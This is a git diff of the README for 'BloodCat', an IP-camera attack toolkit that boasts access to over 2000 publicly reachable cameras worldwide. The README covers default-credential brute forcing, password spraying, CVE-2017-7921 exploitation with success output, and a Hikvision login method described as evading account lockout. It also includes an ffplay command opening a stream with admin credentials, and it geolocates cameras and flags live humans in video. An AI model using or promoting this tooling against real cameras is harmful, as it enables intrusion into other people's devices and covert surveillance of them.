@@ -41,7 +41,7 @@ Once you become aware of their existence, you may realize how close and real onl
 
 🤦‍♂️ Are you still struggling with the lack of practical tools for exploiting IP camera vulnerabilities?
 
-🌏 BloodCat officially provides over 🔥1500+🔥 publicly accessible IP camera examples worldwide.
+🌏 BloodCat officially provides over 🔥2000+🔥 publicly accessible IP camera examples worldwide.
 
 🎥 A comprehensive IP Camera penetration testing toolkit, featuring default credential enumeration, CVE exploitation, and additional capabilities — with support for collaborative team usage.
 
@@ -84,7 +84,7 @@ Once you become aware of their existence, you may realize how close and real onl
   <td><img src="./pic/hik-image-4.png" width="100%"></td>
 </tr>
 <tr>
-  <td><img src="./pic/hik2.png" width="100%"></td>
+  <td><img src="./pic/p-1.png" width="100%"></td>
   <td><img src="./pic/hik-image.png" width="100%"></td>
 </tr>
 </table>
@@ -96,13 +96,14 @@ Once you become aware of their existence, you may realize how close and real onl
 </tr>
  
 </table>
-
+ 
 ---
 
 # Bloodcat Index
 
 - [Video](#official-video)
 - [Install](#bloodcat-installation)
+- [Bloodcat Workflow](#bloodcat-workflow)
 - [Bloodcat](#bloodcat)
 - [Evil bat](#evil-bat)
 - [Shodan cat](#shodan-cat)
@@ -113,6 +114,8 @@ Once you become aware of their existence, you may realize how close and real onl
 - [Bloodcat Lan Map](#bloodcat-lan-map)
 - [Bloodcat Editor](#bloodcat-editor)
 - [Bloodcat Nmap (Run immediately)](#bloodcat-nmap)
+
+
 
 ---
 
@@ -153,6 +156,8 @@ Once you become aware of their existence, you may realize how close and real onl
   </a>
 </div>
 
+
+
 ---
 
 # Other Video
@@ -164,7 +169,24 @@ Once you become aware of their existence, you may realize how close and real onl
 </a>
 </div>
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
 
+
+---
+
+# Bloodcat Workflow
+ 
+
+
+![alt text](./pic/router.png)
+
+
+
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
 
 ---
 
@@ -183,10 +205,18 @@ $ source ./bloodcat/bin/activate
 (bloodcat)$ pip install opencv-python aiohappyeyeballs aiohttp aiosignal async-timeout attrs certifi charset-normalizer frozenlist geoip2 idna maxminddb multidict propcache pycryptodome PyQt5 PyQt5-Qt5 PyQt5_sip PyQtWebEngine PyQtWebEngine-Qt5 requests typing_extensions urllib3 yarl numpy 
 ``` 
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
+
  
 ---
 
 # Bloodcat
+
+You only need to provide the IP and port in the format IP:PORT.
+
+The program will automatically detect whether the target is a private or public IP address and store the results in separate locations accordingly.
 
 **About:**
 1. Integrates with search engines, enabling target filtering and continuous scanning operations by country, region, or city.
@@ -206,13 +236,42 @@ However, you don’t need to open the link manually.**
 **Simply reload the module in BloodCat-Map, then use the IP search in the top-right corner to locate the target.
 Click the target, and the video will play directly.**
 
+ 
+
 ```bash
 (bloodcat)$ python3 bloodcat.py -h
+```
+
+```bash
+usage: bloodcat.py [-h] [--country COUNTRY] [--city CITY] [--region REGION] [--key KEY] [--ip IP] [--ips IPS] [--password PASSWORD] [--merge]
+                   [--hiv HIV] [--live LIVE] [--update]
+
+Blood Cat - IP Camera Weak Credential Scanner
+
+options:
+  -h, --help           show this help message and exit
+  --country COUNTRY    Country
+  --city CITY          City
+  --region REGION      Area
+  --key KEY            Fofa API key
+  --ip IP              IP:PORT
+  --ips IPS            Targets list file (each line: IP or IP:PORT)
+  --password PASSWORD  Password spraying
+  --merge              Merge and update all data in ./data into a single BC file
+  --hiv HIV            Load Hikvision credentials file
+  --live LIVE          Filter currently active cameras in the BC file
+  --update             Check for the latest version and update
+
 ```
 
 ![alt text](./pic/image.png)
 
 
+![alt text](./pic/p-1.png)
+
+
+
+ 
 ## Bruteforce a specific camera IP
 
 
@@ -307,6 +366,10 @@ Replace the original global.bc file, then right-click Reload in BloodCat_Map:
 
 ![alt text](./pic/u1.png)
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
+
 
 ---
 
@@ -333,7 +396,18 @@ ID   Name                           Description
 
 ## Hikvision Crack && iVMS-4200 
 
+You can use the Bloodcat main program to test credentials on Hikvision cameras.
+
+Under normal circumstances, when authentication attempts are made through the HTTP authentication interface, the device will trigger an account lockout mechanism after more than five consecutive failed login attempts, resulting in the admin account being locked.
+
+The Bloodcat main program does not rely on the standard HTTP authentication process, and therefore does not trigger the account lockout policy.
+
+If credential-based access cannot be obtained, you may proceed with the CVE module for further validation and analysis.
+
+
 iVMS-4200 download link : https://github.com/MartinxMax/BloodCat/releases/tag/play
+
+
 
 
 
@@ -347,8 +421,8 @@ Parameter       | Value    | Description
 ----------------------------------------------------------------------
 ips            |         | Hosts file (<IP>:<Port>)
 threads        | 10      | Thread count
-output_type    | json    | json / csv
-output_path    | ./result.json| Output file
+output_type    | csv    | json / csv
+output_path    | ./result.csv| Output file
 ```
 
 ```bash
@@ -366,7 +440,7 @@ Bloodcat@(CVE-2017-7921)# run
 [*] Start scanning SDK ports (Range: 8000-8100)...
 [SDK Crack Success] X.X.X.X:8000
 [SDK Crack Success] X.X.X.X:8000
-[*] JSON exported successfully: ./result.json (Size: 362 bytes, Number of devices: 2)
+[*] JSON exported successfully: ./result.csv (Size: 362 bytes, Number of devices: 2)
 [*] Done! Exported 2 devices in total
 ```
 
@@ -447,6 +521,9 @@ It analyzes RTSP video streams to identify the presence of living humans and aut
 
 ![alt text](./pic/ev-3.png)
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
 
 
 ---
@@ -459,6 +536,10 @@ https://github.com/MartinxMax/shodancat
 
 
 ![alt text](./pic/sd-1.png)
+
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
 
 ---
 
@@ -474,6 +555,9 @@ https://github.com/MartinxMax/PicThief
 
 ![alt text](./pic/pc-1.png)
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
 
 ---
 
@@ -538,6 +622,12 @@ TEAM A:
 TEAM B:
 ![alt text](./pic/image-9.png)
  
+
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
+
+
 ---
 
 # Bloodcat Map Terminal
@@ -593,6 +683,11 @@ BloodCatMap-Terminal# play 1226
 
 ![alt text](./pic/t4.png)
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
+
+
 ---
 
 # BloodCat Nmap
@@ -617,6 +712,11 @@ ips=<File_Name>; nmap -Pn -p "$(curl -s https://raw.githubusercontent.com/Martin
 `$ ffplay -fs -rtsp_transport tcp rtsp://admin:123456@x.x.x.x:554/1`
 
 ![alt text](./pic/nmap3.png)
+
+
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
 
 ---
 
@@ -654,12 +754,15 @@ Download link : https://github.com/MartinxMax/BloodCat/releases/tag/play
 
 ![alt text](./pic/hik-image-4.png)
 
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
+
 ---
 
 # Bloodcat Lan Map
 
-This is a internal network camera viewer
-
+ 
 Test file:
 `https://github.com/MartinxMax/BloodCat/releases/download/play/BloodCat_Map_LAN_Test.zip`
 
@@ -693,6 +796,12 @@ $ python3 bloodcat_map_lan.py
 ![alt text](./pic/bloodcat_map_lan-1.png)
 
 ![alt text](./pic/bloodcat_map_lan-2.png)
+
+
+<p align="center">
+  <a href="#bloodcat-index">⬆ Back to Index</a>
+</p>
+
 
 ---
 
